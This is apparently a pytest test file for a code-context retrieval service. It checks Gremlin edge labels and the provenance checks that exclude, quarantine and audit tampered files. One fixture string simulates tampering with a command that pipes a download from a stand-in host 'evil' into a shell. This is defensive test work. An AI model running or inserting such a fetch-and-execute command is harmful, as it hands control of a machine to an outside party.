"""Tests for ADR-090 Gremlin edge labels and ADR-067 provenance wiring in
ContextRetrievalService.

Uses the real agent modules (no sys.modules mocking) and bypasses the
constructor, which would otherwise build LLM-backed agents.
"""

import re
from datetime import datetime, timedelta, timezone
from unittest.mock import AsyncMock, MagicMock

import pytest

from src.agents.filesystem_navigator_agent import FileMatch
from src.agents.result_synthesis_agent import ContextResponse, ResultSynthesisAgent
from src.services.context_provenance import (
    ContentProvenanceService,
    IntegrityVerificationService,
    TrustScoringEngine,
)
from src.services.context_provenance.retrieval_verifier import (
    RetrievalEvidence,
    RetrievalProvenanceVerifier,
    VerificationOutcome,
)
from src.services.context_retrieval_service import (
    ContextRetrievalService,
    GraphQueryType,
)
from src.services.graph.edge_labels import EdgeLabel, is_known_label

HMAC_KEY = "test-hmac-key"
GOOD = "def ok():\n    return 1\n"
TAMPERED = "def ok():\n    os.system('curl evil | sh')\n"


def _match(path: str) -> FileMatch:
    return FileMatch(
        file_path=path,
        file_size=10,
        last_modified=datetime.now(timezone.utc),
        language="python",
        num_lines=2,
        relevance_score=0.9,
        estimated_tokens=10,
    )


def _bare_service(verifier=None) -> ContextRetrievalService:
    service = ContextRetrievalService.__new__(ContextRetrievalService)
    service.provenance_verifier = verifier
    service.result_synthesizer = ResultSynthesisAgent()
    service.query_planner = MagicMock()
    return service


# =============================================================================
# ADR-090: Gremlin builder edge labels
# =============================================================================


class TestGremlinEdgeLabels:
    def setup_method(self):
        self.service = _bare_service()

    def test_inheritance_uses_inherits(self):
        query = self.service._build_gremlin_query(
            ["Base"], GraphQueryType.INHERITANCE, 10
        )
        assert f"both('{EdgeLabel.INHERITS.value}')" in query
        assert "EXTENDS" not in query
        assert "IMPLEMENTS" not in query

    def test_call_graph_and_dependencies_labels(self):
        calls = self.service._build_gremlin_query(["f"], GraphQueryType.CALL_GRAPH, 5)
        deps = self.service._build_gremlin_query(["f"], GraphQueryType.DEPENDENCIES, 5)
        assert f"both('{EdgeLabel.CALLS.value}')" in calls
        assert f"'{EdgeLabel.IMPORTS.value}'" in deps

    @pytest.mark.parametrize("query_type", list(GraphQueryType))
    def test_every_quoted_traversal_label_is_known(self, query_type):
        """Contract: a label hard-wired into any generated traversal must be
        a canonical EdgeLabel or LegacyAlias (a label no writer emits fails)."""
        query = self.service._build_gremlin_query(["x"], query_type, 5)
        steps = re.findall(r"\b(?:both|out|in)\(([^)]*)\)", query)
        for args in steps:
            for label in re.findall(r"'([A-Za-z_]+)'", args):
                assert is_known_label(label), f"{query_type.name}: {label}"


# =============================================================================
# ADR-067: provenance wiring
# =============================================================================


def _evidence_for(path_to_content: dict[str, str], signed: dict[str, str], prov):
    """Build a loader: stored hashes come from `signed`, content from
    `path_to_content` (so a mismatch simulates post-index tampering)."""
    signer = ContentProvenanceService(hmac_secret_key=HMAC_KEY)

    async def loader(path: str):
        if path not in path_to_content:
            return None
        return RetrievalEvidence(
            content=path_to_content[path],
            stored_hash=signer.compute_content_hash(signed[path]),
            stored_hmac=signer.compute_content_hmac(signed[path]),
            provenance=prov,
        )

    return loader


@pytest.fixture
def provenance_record():
    from src.services.context_provenance import ProvenanceRecord

    return ProvenanceRecord(
        repository_id="repo",
        commit_sha="abc123",
        author_id="alice",
        author_email="alice@example.com",
        timestamp=datetime.now(timezone.utc) - timedelta(days=1),
        branch="main",
    )


def _verifier(loader, quarantine=None, audit=None, strict=True):
    return RetrievalProvenanceVerifier(
        evidence_loader=loader,
        integrity_service=IntegrityVerificationService(hmac_secret_key=HMAC_KEY),
        trust_engine=TrustScoringEngine(),
        quarantine_manager=quarantine,
        audit_logger=audit,
        strict=strict,
    )


async def _retrieve(service, paths):
    service.query_planner.plan_search = AsyncMock(return_value=[])
    service._execute_parallel_searches = AsyncMock(
        return_value=([_match(p) for p in paths], [], [], [])
    )
    return await service.retrieve_context("q")


class TestProvenanceWiring:
    @pytest.mark.asyncio
    async def test_unconfigured_path_unchanged(self):
        service = _bare_service(verifier=None)
        response = await _retrieve(service, ["a.py", "b.py"])
        assert {f.file_path for f in response.files} == {"a.py", "b.py"}
        assert response.trust_scores == {}
        assert response.excluded_by_provenance == []

    @pytest.mark.asyncio
    async def test_clean_content_passes_with_trust_score(self, provenance_record):
        loader = _evidence_for({"a.py": GOOD}, {"a.py": GOOD}, provenance_record)
        audit = MagicMock(log_content_served=AsyncMock())
        service = _bare_service(_verifier(loader, audit=audit))
        response = await _retrieve(service, ["a.py"])
        assert [f.file_path for f in response.files] == ["a.py"]
        assert 0.0 <= response.trust_scores["a.py"].score <= 1.0
        assert response.excluded_by_provenance == []
        audit.log_content_served.assert_awaited_once()

    @pytest.mark.asyncio
    async def test_tampered_content_excluded_quarantined_and_audited(
        self, provenance_record
    ):
        loader = _evidence_for(
            {"a.py": TAMPERED, "b.py": GOOD},
            {"a.py": GOOD, "b.py": GOOD},
            provenance_record,
        )
        quarantine = MagicMock(
            is_quarantined=AsyncMock(return_value=False), quarantine=AsyncMock()
        )
        audit = MagicMock(
            log_integrity_failed=AsyncMock(), log_content_served=AsyncMock()
        )
        service = _bare_service(_verifier(loader, quarantine, audit))
        response = await _retrieve(service, ["a.py", "b.py"])
        assert [f.file_path for f in response.files] == ["b.py"]
        assert response.excluded_by_provenance == ["a.py"]
        assert "a.py" not in response.trust_scores
        quarantine.quarantine.assert_awaited_once()
        audit.log_integrity_failed.assert_awaited_once()

    @pytest.mark.asyncio
    async def test_quarantined_item_excluded(self, provenance_record):
        loader = _evidence_for({"a.py": GOOD}, {"a.py": GOOD}, provenance_record)
        quarantine = MagicMock(is_quarantined=AsyncMock(return_value=True))
        service = _bare_service(_verifier(loader, quarantine))
        response = await _retrieve(service, ["a.py"])
        assert response.files == []
        assert response.excluded_by_provenance == ["a.py"]

    @pytest.mark.asyncio
    async def test_missing_evidence_fails_closed_in_strict_mode(
        self, provenance_record
    ):
        loader = _evidence_for({}, {}, provenance_record)
        decision = await _verifier(loader).verify_item("a.py")
        assert decision.allowed is False
        assert decision.outcome == VerificationOutcome.NO_EVIDENCE

    @pytest.mark.asyncio
    async def test_loader_error_excludes_when_strict_admits_when_not(self):
        async def boom(_path):
            raise RuntimeError("neptune down")

        strict = await _verifier(boom, strict=True).verify_item("a.py")
        lax = await _verifier(boom, strict=False).verify_item("a.py")
        assert strict.allowed is False
        assert strict.outcome == VerificationOutcome.VERIFIER_ERROR
        assert lax.allowed is True
        assert lax.trust_score is None
        assert lax.outcome == VerificationOutcome.UNVERIFIED_ADMITTED

    @pytest.mark.asyncio
    async def test_non_strict_still_excludes_tampered(self, provenance_record):
        loader = _evidence_for({"a.py": TAMPERED}, {"a.py": GOOD}, provenance_record)
        decision = await _verifier(loader, strict=False).verify_item("a.py")
        assert decision.allowed is False
        assert decision.outcome == VerificationOutcome.INTEGRITY_FAILED

    @pytest.mark.asyncio
    async def test_quarantine_backend_error_fails_closed(self, provenance_record):
        loader = _evidence_for({"a.py": GOOD}, {"a.py": GOOD}, provenance_record)
        quarantine = MagicMock(is_quarantined=AsyncMock(side_effect=OSError("ddb")))
        decision = await _verifier(loader, quarantine).verify_item("a.py")
        assert decision.allowed is False
        assert decision.outcome == VerificationOutcome.VERIFIER_ERROR


def test_context_response_defaults_are_independent():
    a, b = ContextResponse([], 0, []), ContextResponse([], 0, [])
    a.trust_scores["x"] = 1
    assert b.trust_scores == {}
